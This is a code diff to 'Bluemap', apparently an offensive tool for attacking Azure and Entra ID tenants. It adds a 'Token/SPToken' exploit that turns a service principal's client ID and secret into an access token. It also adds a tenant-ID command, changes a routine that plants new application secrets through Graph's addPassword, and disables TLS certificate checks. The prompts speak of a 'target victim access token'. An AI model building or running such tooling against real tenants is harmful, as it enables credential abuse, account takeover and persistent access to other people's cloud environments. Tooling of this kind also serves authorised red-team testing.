@@ -203,6 +203,34 @@ def sendPOSTRequestRefreshToken(tenantId, token):
         pass
     return object
 
+def sendPOSTRequestSPToken(tenantId, clientId, secretToken):
+    object = {}
+    o = urlparse("https://login.microsoftonline.com/"+str(tenantId)+"/oauth2/v2.0/token")
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    conn = http.client.HTTPSConnection(o.netloc)
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = {
+        'grant_type': 'client_credentials',
+        'client_id': clientId,
+        'scope': '.default',
+        'client_secret': secretToken,
+    }
+    qs = urllib.parse.urlencode(data)
+    conn.request("POST", str(o.path), qs, headers)
+    res = conn.getresponse()
+    object["headers"] = dict(res.getheaders())
+    object["status_code"] = int(res.status)
+    object["response"] = str(res.read().decode("utf-8"))
+    try:
+        object["json"] = json.loads(object["response"])
+    except json.JSONDecodeError:
+        pass
+    return object
+
 def DeviceCodeFlow():
     object = {}
     o = urlparse("https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0")
@@ -231,7 +259,7 @@ def DeviceCodeFlow():
         pass
     return object
 
-def DeviceCodeFlowAuthUser(teantnId, deviceCode, userCode):
+def DeviceCodeFlowAuthUser(teantnId, deviceCode):
     object = {}
     o = urlparse("https://login.microsoftonline.com/"+str(teantnId)+"/oauth2/v2.0/token")
     ctx = ssl.create_default_context()
@@ -282,6 +310,7 @@ def sendPUTRequest(url, body, Token):
     except json.JSONDecodeError:
         pass
     return object
+
 def get_random_string(size):
     chars = string.ascii_lowercase+string.ascii_uppercase+string.digits
     ''.join(random.choice(chars) for _ in range(size))
@@ -294,7 +323,10 @@ def parseUPN():
     else:
         b64_string = Token.split(".")[1]
         b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
-        return json.loads(base64.b64decode(b64_string))['upn']
+        data = json.loads(base64.b64decode(b64_string))
+        if 'app_displayname' in data:
+            return data['app_displayname'] + "@" + data['tid'] 
+        return data['upn']
 
 def parseUPNObjectId():
     global Token
@@ -958,7 +990,7 @@ def RD_addPasswordForEntrepriseApp(appId):
         addSecretPwd = sendPOSTRequest("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/addPassword", req, accessTokenGraph)
         if addSecretPwd['status_code'] == 200:
             pwdOwn = addSecretPwd['json']
-            return "AppId: " + pwdOwn['keyId'] + "| Pwd: " + pwdOwn['secretText']
+            return "AppId: " + appId + "| Pwd: " + pwdOwn['secretText']
         else:
             return "N/A"
     else:
@@ -1350,6 +1382,7 @@ def attackWindow():
     '''
     supportedCommands = [
         "version",
+        "tid",
         "whoami",
         "scopes",
         "get_subs",
@@ -1374,6 +1407,7 @@ def attackWindow():
     ]
     exploits = [
         "Token/AuthToken",
+        "Token/SPToken",
         "Token/GenToken",
         "Token/SetToken",
         "Token/RefreshToken",
@@ -1424,6 +1458,11 @@ def attackWindow():
                 print("Bluemap 1.0.0-Beta")
             elif mode == "whoami":
                 currentProfile()
+            elif mode == "tid":
+                if Token == None:
+                    print("Please set target victim access token. Use Token/* exploits.")
+                else:
+                    parseTenantId()
             elif mode == "scopes":
                 currentScope()
             elif mode == "get_subs" or mode == "subs":
@@ -1647,6 +1686,18 @@ def attackWindow():
             elif mode == "deltoken":
                 print("Resetting token..")
                 setToken("")
+            elif "Token/SPToken" in ExploitChoosen and mode == "run":
+                TenantId = input("Enter TenantId: ")
+                AppId = input("Enter AppId: ")
+                Secret = input("Enter Secret: ")
+                r = sendPOSTRequestSPToken(TenantId, AppId, Secret)
+                response = r["json"]
+                if 'access_token' in response:
+                    print("Credentials OK, Generate token...")
+                    initToken(response['access_token'], False)
+                    print("Done.")
+                else:
+                    print("Invalid Service Principle AppId / Secret / TenantId.")
             elif "Token/GenToken" in ExploitChoosen and mode == "run":
                 print("Trying getting token automatically for you...")
                 AutoGenToken = True
@@ -1671,8 +1722,8 @@ def attackWindow():
                         initToken(token, False)
                         print("Token Refresh. Done.")
                 else:
-                    ''' For any other manual method (Token/SetToken or Token/AuthToken)'''
-                    print("Refresh token not supported for Token/SetToken or Token/AuthToken. Try to login again.")
+                    ''' For any other manual method (Token/SetToken or Token/AuthToken or Token/SPToken)'''
+                    print("Refresh token not supported for Token/SetToken or Token/AuthToken or Token/SPToken. Try to login again.")
             elif "Reader/ExposedAppServiceApps" in ExploitChoosen and mode == "run":
                 print("Trying to enumerate all external-facing Azure Service Apps..")
                 if len(RD_ListExposedWebApps()) < 1:
@@ -1904,11 +1955,13 @@ def attackWindow():
                     print("Credentials OK, continue..")
                     x = DeviceCodeFlow()
                     dc = x["json"]["device_code"]
-                    uc = x["json"]["user_code"]
+                    b64_string = response['access_token'].split(".")[1]
+                    b64_string += "=" * ((4 - len(response['access_token'].split(".")[1].strip()) % 4) % 4)
+                    TenantId = json.loads(base64.b64decode(b64_string))['tid']
                     print("Now follow the next steps to complete the process:")
                     print(x["json"]["message"])
                     while(True):
-                        res = DeviceCodeFlowAuthUser("5adb82f3-e85b-42af-b237-adf6e094f963",dc, uc)["json"]
+                        res = DeviceCodeFlowAuthUser(TenantId,dc)["json"]
                         if 'error_description' in res:
                             continue
                         else:
